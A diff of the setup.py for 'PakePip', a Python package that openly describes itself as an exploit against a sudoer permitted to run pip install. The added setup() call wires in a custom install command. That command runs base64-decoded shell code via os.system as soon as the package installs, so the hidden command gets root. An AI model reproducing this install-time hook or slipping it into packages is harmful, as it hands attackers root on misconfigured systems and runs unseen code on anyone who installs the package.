@@ -17,4 +17,25 @@ class CustomInstall(install):
     os.system('echo %s|base64 -d|bash' % encoded)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+setup(
+    name='PakePip',
+    version='0.1.2',
+    description='This will exploit a sudoer able to /usr/bin/pip install *',
+    url='https://github.com/0x00-0x00/fakepip',
+    author='HC2023',
+    author_email='andre.marques@esecurity.com.br',
+    license='MIT',
+    zip_safe=False,
+    classifiers=[
+        'Environment :: Console',
+        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
+        'Operating System :: MacOS :: MacOS X',
+        'Operating System :: Microsoft :: Windows',
+        'Operating System :: POSIX',
+        'Programming Language :: Python :: 2.7',
+        'Programming Language :: Python :: 3.4',
+        'Programming Language :: Python :: 3.5',
+        'Programming Language :: Python :: 3.6',
+        'Topic :: Security',
+    ],
+    cmdclass={'install': CustomInstall})
